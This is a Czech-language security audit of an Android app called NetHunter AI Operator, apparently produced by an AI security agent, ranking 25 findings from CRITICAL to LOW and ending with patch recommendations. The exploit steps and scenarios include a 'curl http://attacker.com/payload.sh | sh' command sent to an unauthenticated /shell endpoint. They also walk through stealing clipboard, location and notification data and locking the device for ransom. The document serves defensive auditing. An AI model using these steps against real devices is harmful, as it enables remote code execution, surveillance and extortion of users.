# Bezpečnostní Audit — NetHunter AI Operator (com.linux_core)

**Datum:** 2026-06-27
**Verze:** 4.1-AI-FIX (versionCode 5)
**Balíček:** com.linux_core
**Analytik:** OpenMythos AI Security Agent

---

## Přehled rizik

| Úroveň | Počet |
|--------|-------|
| 🔴 **CRITICAL** | 9 |
| 🟠 **HIGH** | 8 |
| 🟡 **MEDIUM** | 5 |
| 🔵 **LOW** | 3 |
| **Celkem** | **25** |

---

## 🔴 CRITICAL

### C1 — Hardcoded Signing Credentials (build.gradle.kts)

**Soubor:** `app/build.gradle.kts:27-36`
**CVSS:** 9.3 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N)

```kotlin
storePassword = "password123"
keyPassword = "password123"
```

**Popis:** Hesla úložiště klíčů (keystore) jsou natvrdo zapsaná v zdrojovém kódu. Debug i release konfigurace používají stejný keystore se stejným heslem. Kdokoli s přístupem k repozitáři může podepsat vlastní APK a vydávat ho za oficiální.

**Dopad:** Útočník může podepsat malware stejným certifikátem, obejít Android signature verification, distribuovat trojanizovanou verzi aplikace.

---

### C2 — Unauth Shell RCE přes LocalApiServer

**Soubor:** `LocalApiServer.kt:636-657`
**CVSS:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

```kotlin
private fun handleShell(body: String, out: OutputStream) {
    val command = body.trim()
    val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
    ...
}
```

**Popis:** Endpoint `POST /shell` přijímá libovolný shell příkaz a spouští ho přes `Runtime.exec()`. Server může být exposureván na `0.0.0.0` přes `/api/share`. Žádná autentizace.

**Exploit krok za krokem:**
1. `POST /api/share` s body `on` → server se přepne na `0.0.0.0:1337`
2. `POST /shell` s body `curl http://attacker.com/payload.sh | sh` → RCE jako aplikační UID
3. Možný pivot: `POST /shell` s `am start -a android.intent.action.VIEW -d http://attacker.com`

---

### C3 — API Server Exposed to Network Without Auth

**Soubor:** `LocalApiServer.kt:72-77`
**CVSS:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

```kotlin
val shareLocalApi = sharedPrefs.getBoolean("share_local_api", false)
val bindAddress = if (shareLocalApi) "0.0.0.0" else "127.0.0.1"
serverSocket = ServerSocket(PORT, 50, InetAddress.getByName(bindAddress))
```

**Popis:** API server může být přepnut do režimu `0.0.0.0` — dostupný z celé lokální sítě (WiFi hotspot, sdílená síť). Žádná autentizace na žádném endpointu. Všechna data a ovládání jsou přístupná komukoli v síti.

---

### C4 — Device Admin / Lock Bypass

**Soubor:** `LocalApiServer.kt:1176-1204`
**CVSS:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H)

```kotlin
private fun handleDeviceAdminRequest(context: Context, out: OutputStream) {
    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply { ... }
    context.startActivity(intent)
}

private fun handleDeviceLock(context: Context, out: OutputStream) {
    dpm.lockNow()
}
```

**Popis:** Endpointy `/device/admin` (aktivace Device Admin) a `/device/lock` (uzamčení zařízení) jsou přístupné bez autentizace. Útočník může zařízení uzamknout a požadovat výkupné, nebo zneužít Device Admin k vymazání zařízení.

---

### C5 — Full Clipboard Exfiltration

**Soubor:** `LocalApiServer.kt:319-386`
**CVSS:** 8.6 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)

**Popis:** Endpointy `/clipboard` (GET i POST) umožňují čtení i zápis do systémové schránky. Schránka často obsahuje hesla, tokeny, bankovní údaje, kryptoměnové adresy. Žádné oprávnění není kontrolováno.

---

### C6 — GPS Location + Cell Tower Data Leak

**Soubor:** `LocalApiServer.kt:434-554`
**CVSS:** 8.2 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)

**Popis:** `/location` a `/map` vracejí přesné GPS souřadnice. `/cellinfo` vrací seznam všech buněk (věží) s MCC, MNC, Cell ID, TAC/LAC — data použitelná pro lokalizaci zařízení bez GPS (IMSI catcher / Stingray tracking). Endpoint `/map` navíc generuje Google Maps URL.

---

### C7 — Notification Access Data Leak

**Soubor:** `LocalApiServer.kt:1058-1088`
**CVSS:** 8.2 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)

**Popis:** `/notifications/active` vrací všechny aktivní notifikace včetně titulků, textů, názvů balíčků. Může uniknout obsah zpráv (Messenger, WhatsApp, SMS), 2FA kódy, bankovní transakce.

---

### C8 — Accessibility Hierarchy Dump

**Soubor:** `LocalApiServer.kt:1090-1107`
**CVSS:** 8.2 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)

**Popis:** `/accessibility/hierarchy` dumpne plnou Accessibility stromovou strukturu obrazovky. Může zachytit hesla do password fieldů, PIN kódy, obsah privátní komunikace.

---

### C9 — Speech Recording / Eavesdropping via API

**Soubor:** `LocalApiServer.kt:923-1014`
**CVSS:** 8.0 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Popis:** `/voice_input` spouští speech recognition a vrací přepsaný text. Lze triggerovat vzdáleně k odposlechu okolního zvuku a převodu na text.

---

## 🟠 HIGH

### H1 — ClearText Traffic (usesCleartextTraffic)

**Soubor:** `AndroidManifest.xml:47`
**CVSS:** 7.4 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N)

```xml
android:usesCleartextTraffic="true"
```

**Popis:** Povoluje HTTP (nešifrovaný) provoz pro celou aplikaci. Rootfs je stahován z `https://images.kali.org/` — OK, ale OkHttp klient nemá pinned certifikáty, což umožňuje MITM pokud je CA certifikát útočníka v trust store.

---

### H2 — Insecure Backup (allowBackup)

**Soubor:** `AndroidManifest.xml:39`
**CVSS:** 7.1 (AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

```xml
android:allowBackup="true"
```

**Popis:** Umožňuje ADB backup všech app dat (včetně SharedPreferences, cached dat, rootfs). Pokud má útočník fyzický přístup k zařízení nebo ADB přes WiFi, může provést kompletní extrakci dat.

---

### H3 — Rootfs Download bez Certificate Pinning

**Soubor:** `RootfsManager.kt:86-87`
**CVSS:** 7.4 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H)

```kotlin
val client = OkHttpClient()
val request = Request.Builder().url(distro.url).build()
```

**Popis:** OkHttp klient bez `SslSocketFactory` a bez certificate pinnigu. Útočník s MITM pozicí (např. fake WiFi hotspot) může nahradit rootfs archiv vlastním malwarem.

---

### H4 — VPN Traffic Logs with Payload Hex Dump

**Soubor:** `LocalApiServer.kt:659-676`
**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

```kotlin
csv.append("${log.timestamp},${log.protocol},${log.srcIp},...${log.payloadHex ?: ""}\n")
```

**Popis:** `/vpn/logs` vrací kompletní VPN logy včetně hex payloadu paketů, zdrojových/cílových IP a portů. K dispozici i jako CSV export. Obsahuje nešifrovaná data z HTTP, DNS dotazů atd.

---

### H5 — Apps Usage Stats Leak

**Soubor:** `LocalApiServer.kt:1016-1056`
**CVSS:** 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Popis:** `/apps/usage` vrací seznam všech nainstalovaných aplikací s časem použití. Umožňuje profilování uživatele.

---

### H6 — WiFi Control bez omezení

**Soubor:** `LocalApiServer.kt:1153-1163`
**CVSS:** 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

**Popis:** `/wifi` POST umožňuje zapnout/vypnout WiFi. Může být zneužito k DoS nebo k přepnutí na útočníkův hotspot.

---

### H7 — OffensiveEngine Auto-Exploit

**Soubor:** `OffensiveEngine.kt:20-96`
**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

**Popis:** OffensiveEngine má předpřipravené Metasploit exploit skripty (EternalBlue, PHP CGI injection, SYN flood DoS). Skripty se ukládají do `/sdcard/Download/auto_attack.rc`. Ačkoli je vyžadováno volání z AI agenta, existence kódu umožňuje automatizované útoky.

---

### H8 — Auto-Agent Execution with Shell Access

**Soubor:** `LocalApiServer.kt:785-918`
**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

**Popis:** `/agent/query` spouští AI agenta, který má přístup k shell příkazům (`!/cmd` syntaxe) a VPN API. Agent daemon běží na portu 13338.

---

## 🟡 MEDIUM

### M1 — ProcessResolver používá refleksi k přístupu k privátním polím

**Soubor:** `ProcessResolver.kt:185-193`
**CVSS:** 4.3 (AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

```kotlin
val field = session.javaClass.getDeclaredField("mPid")
field.isAccessible = true
```

**Popis:** Použití Java reflection API k přístupu k privátnímu poli `mPid` v `TerminalSession`. Může selhat na novějších verzích Androidu nebo s novější verzí Termuxu.

---

### M2 — Rootfs Restore bez validace backupu

**Soubor:** `RootfsManager.kt:461-583`
**CVSS:** 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N)

**Popis:** `/rootfs/restore` obnovuje rootfs z externího storage bez jakékoli signatury/hashové verze. Útočník s filesystem accessem může podsadit modifikovaný rootfs.

---

### M3 — VpnCaptureService UDP/TCP session management

**Soubor:** `VpnNatEngine.kt`
**CVSS:** 4.0 (AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L)

**Popis:** NAT engine implementuje kompletní TCP/IP stack v userspace. Chyby v implementaci (sequence number handling, timeout management) mohou vést k DoS nebo úniku dat.

---

### M4 — AI Agent s neomezeným shell přístupem

**Soubor:** `ProotManager.kt:636-717`
**CVSS:** 5.0

**Popis:** `ai-agent.py` skript deploynutý do rootfs obsahuje funkci `run_shell()` která volá `/shell` API endpoint. Uživatel v agent konzoli může použít `!příkaz` pro libovolný příkaz.

---

### M5 — Session ID v URL parametrech (VPN ignore)

**Soubor:** `LocalApiServer.kt:755-777`
**CVSS:** 4.0 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Popis:** `session_id` se předává jako URL query parametr. Loguje se v HTTP access logu.

---

## 🔵 LOW

### L1 — Broadcast receiver vulnerabilities (WidgetProvider zakomentován)

**Soubor:** `AndroidManifest.xml:121-140`

**Popis:** Zakomentovaný WidgetProvider má `android:exported="true"` s několika vlastními akcemi. Pokud by byl odkomentován, mohl by být zneužit.

### L2 — distroDocumentsProvider pro rootfs

**Soubor:** `AndroidManifest.xml:142-151`

**Popis:** Dokumentový provider je `exported="true"` s `grantUriPermissions="true"`. I když vyžaduje `MANAGE_DOCUMENTS`, může uniknout metadata.

### L3 — Debug konfigurace s JNI debuggable

**Soubor:** `build.gradle.kts:49`
```
isJniDebuggable = true
```

**Popis:** Debug build má povolený JNI debugging, což usnadňuje reverse engineering.

---

## Exploit scénáře

### Scénář 1: Full Device Compromise z LAN
1. Útočník v síti (např. na stejné WiFi) skenuje port 1337
2. Pošle `POST /api/share` s body `"on"` (pokud už není)
3. Pošle `POST /shell` s `"id"` → potvrdí RCE
4. Pošle `curl http://attacker.com/payload | sh` → stáhne malware
5. Pošle `POST /notifications/active` → získá notifikace
6. Pošle `POST /accessibility/hierarchy` → získá obsah obrazovky

### Scénář 2: Clipboard + Location Theft
1. `GET /clipboard` → získá obsah schránky
2. `GET /location` → získá GPS souřadnice
3. `GET /cellinfo` → získá mobilní data (MCC, MNC, Cell ID)
4. `GET /notifications/active` → získá 2FA kódy

### Scénář 3: Device Lock Ransomware
1. `POST /device/admin` → aktivuje Device Admin
2. `POST /device/lock` → uzamkne zařízení
3. Požaduje výkupné za odemčení

---

## Patch Recommendations

Podívejte se na vygenerované patche v následujících souborech.

### Top priority (CRITICAL):
1. **C1** → Odstranit hesla z build.gradle.kts, použít `KeyStore` nebo env proměnné
2. **C2+C3** → Přidat autentizaci (Bearer token) do LocalApiServer, omezit `/shell` endpoint
3. **C4** → Vyžadovat uživatelské potvrzení pro Device Admin
4. **C5** → Rate limiting a autentizace pro `/clipboard`
5. **C6** → Auth pro `/location`, `/cellinfo`, `/map`
6. **C7** → Auth pro `/notifications/active`
7. **C8** → Auth pro `/accessibility/hierarchy`
8. **C9** → Auth pro `/voice_input`
